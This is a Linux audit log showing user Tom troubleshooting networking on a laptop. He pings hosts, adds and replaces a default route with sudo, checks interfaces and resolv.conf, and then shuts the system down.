type=PATH msg=audit(1789396973.197:55): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396973.197:55): proctitle=697000676F6F676C652E636F6D
type=SYSCALL msg=audit(1789396979.493:56): arch=c000003e syscall=59 success=yes exit=0 a0=56026d4179c0 a1=56026d415f30 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=633 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789396979.493:56): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789396979.493:56): argc=2 a0="ping" a1="google.com"
type=CWD msg=audit(1789396979.493:56): cwd="/home/Tom"
type=PATH msg=audit(1789396979.493:56): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396979.493:56): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396979.493:56): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396979.493:56): proctitle=70696E6700676F6F676C652E636F6D
type=SYSCALL msg=audit(1789396988.969:57): arch=c000003e syscall=59 success=yes exit=0 a0=56026d317ef0 a1=56026d317ed0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=634 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789396988.969:57): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789396988.969:57): argc=2 a0="ping" a1="google.com"
type=CWD msg=audit(1789396988.969:57): cwd="/home/Tom"
type=PATH msg=audit(1789396988.969:57): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396988.969:57): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789396988.969:57): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789396988.969:57): proctitle=70696E6700676F6F676C652E636F6D
type=SYSCALL msg=audit(1789397036.061:58): arch=c000003e syscall=59 success=yes exit=0 a0=56026d3ab660 a1=56026d3c79a0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=637 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397036.061:58): argc=9 a0="sudo" a1="ip" a2="route" a3="add" a4="default" a5="via" a6="192.168.0.254" a7="dev" a8="etho0"
type=CWD msg=audit(1789397036.061:58): cwd="/home/Tom"
type=PATH msg=audit(1789397036.061:58): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397036.061:58): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397036.061:58): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397036.061:58): proctitle=7375646F00697000726F757465006164640064656661756C7400766961003139322E3136382E302E32353400646576006574686F30
type=USER_AUTH msg=audit(1789397041.253:59): pid=637 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789397041.253:60): pid=637 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789397041.253:61): pid=637 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=697020726F757465206164642064656661756C7420766961203139322E3136382E302E32353420646576206574686F30 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789397041.253:62): pid=637 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789397041.253:63): pid=637 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789397041.265:64): pid=637 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789397041.265:65): pid=637 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789397044.313:66): arch=c000003e syscall=59 success=yes exit=0 a0=56026d3f5030 a1=56026d3e53f0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=642 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397044.313:66): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789397044.313:66): cwd="/home/Tom"
type=PATH msg=audit(1789397044.313:66): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397044.313:66): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397044.313:66): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397044.313:66): proctitle=69700061
type=SYSCALL msg=audit(1789397052.821:67): arch=c000003e syscall=59 success=yes exit=0 a0=56026d3322e0 a1=56026d3c79a0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=643 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397052.821:67): argc=9 a0="sudo" a1="ip" a2="route" a3="add" a4="default" a5="via" a6="192.168.0.254" a7="dev" a8="eth0"
type=CWD msg=audit(1789397052.821:67): cwd="/home/Tom"
type=PATH msg=audit(1789397052.821:67): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397052.821:67): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397052.821:67): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397052.821:67): proctitle=7375646F00697000726F757465006164640064656661756C7400766961003139322E3136382E302E323534006465760065746830
type=USER_ACCT msg=audit(1789397052.829:68): pid=643 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789397052.829:69): pid=643 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=697020726F757465206164642064656661756C7420766961203139322E3136382E302E323534206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789397052.829:70): pid=643 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789397052.829:71): pid=643 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789397052.833:72): pid=643 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789397052.833:73): pid=643 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789397065.973:74): arch=c000003e syscall=59 success=yes exit=0 a0=56026d316600 a1=56026d3c79a0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=646 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397065.973:74): argc=9 a0="sudo" a1="ip" a2="route" a3="replace" a4="default" a5="via" a6="192.168.0.254" a7="dev" a8="eth0"
type=CWD msg=audit(1789397065.973:74): cwd="/home/Tom"
type=PATH msg=audit(1789397065.973:74): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397065.973:74): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397065.973:74): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397065.973:74): proctitle=7375646F00697000726F757465007265706C6163650064656661756C7400766961003139322E3136382E302E323534006465760065746830
type=USER_ACCT msg=audit(1789397065.981:75): pid=646 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789397065.981:76): pid=646 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=697020726F757465207265706C6163652064656661756C7420766961203139322E3136382E302E323534206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789397065.981:77): pid=646 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789397065.981:78): pid=646 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789397065.985:79): pid=646 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789397065.985:80): pid=646 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789397070.725:81): arch=c000003e syscall=59 success=yes exit=0 a0=56026d4132d0 a1=56026d3d74e0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=649 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789397070.725:81): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789397070.725:81): argc=2 a0="ping" a1="8.8.8.8"
type=CWD msg=audit(1789397070.725:81): cwd="/home/Tom"
type=PATH msg=audit(1789397070.725:81): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397070.725:81): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397070.725:81): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397070.725:81): proctitle=70696E6700382E382E382E38
type=SYSCALL msg=audit(1789397082.273:82): arch=c000003e syscall=59 success=yes exit=0 a0=56026d3322c0 a1=56026d3fc210 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=650 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789397082.273:82): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789397082.273:82): argc=2 a0="ping" a1="8.8.8.8"
type=CWD msg=audit(1789397082.273:82): cwd="/home/Tom"
type=PATH msg=audit(1789397082.273:82): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397082.273:82): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397082.273:82): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397082.273:82): proctitle=70696E6700382E382E382E38
type=SYSCALL msg=audit(1789397129.789:83): arch=c000003e syscall=59 success=yes exit=0 a0=56026d3ddca0 a1=56026d3322e0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=651 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ping" exe="/usr/bin/ping" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=BPRM_FCAPS msg=audit(1789397129.789:83): fver=2 fp=0000000000002000 fi=0 fe=1 old_pp=0 old_pi=0 old_pe=0 old_pa=0 pp=0000000000002000 pi=0 pe=0000000000002000 pa=0 frootid=0
type=EXECVE msg=audit(1789397129.789:83): argc=2 a0="ping" a1="192.168.0.1"
type=CWD msg=audit(1789397129.789:83): cwd="/home/Tom"
type=PATH msg=audit(1789397129.789:83): item=0 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397129.789:83): item=1 name="/usr/bin/ping" inode=395643 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000002000 cap_fi=0 cap_fe=1 cap_fver=2 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397129.789:83): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397129.789:83): proctitle=70696E67003139322E3136382E302E31
type=SYSCALL msg=audit(1789397180.745:84): arch=c000003e syscall=59 success=yes exit=0 a0=56026d3e5eb0 a1=56026d4179c0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=652 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397180.745:84): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789397180.745:84): cwd="/home/Tom"
type=PATH msg=audit(1789397180.745:84): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397180.745:84): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397180.745:84): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397180.745:84): proctitle=69700061
type=SYSCALL msg=audit(1789397200.181:85): arch=c000003e syscall=59 success=yes exit=0 a0=56026d443b50 a1=56026d3180b0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=659 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="cat" exe="/usr/bin/cat" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397200.181:85): argc=2 a0="cat" a1="/etc/resolv.conf"
type=CWD msg=audit(1789397200.181:85): cwd="/home/Tom"
type=PATH msg=audit(1789397200.181:85): item=0 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397200.181:85): item=1 name="/usr/bin/cat" inode=393339 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397200.181:85): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397200.181:85): proctitle=636174002F6574632F7265736F6C762E636F6E66
type=SYSCALL msg=audit(1789397219.901:86): arch=c000003e syscall=59 success=yes exit=0 a0=56026d316680 a1=56026d447ed0 a2=56026d319390 a3=71f7f69e3dd18b1 items=3 ppid=629 pid=660 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397219.901:86): argc=4 a0="sudo" a1="shutdown" a2="-h" a3="now"
type=CWD msg=audit(1789397219.901:86): cwd="/home/Tom"
type=PATH msg=audit(1789397219.901:86): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397219.901:86): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397219.901:86): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397219.901:86): proctitle=7375646F0073687574646F776E002D68006E6F77
type=USER_ACCT msg=audit(1789397219.909:87): pid=660 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789397219.909:88): pid=660 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=73687574646F776E202D68206E6F77 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789397219.909:89): pid=660 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789397219.909:90): pid=660 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789397219.929:91): pid=660 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789397219.929:92): pid=660 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SERVICE_STOP msg=audit(1789397219.965:93): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
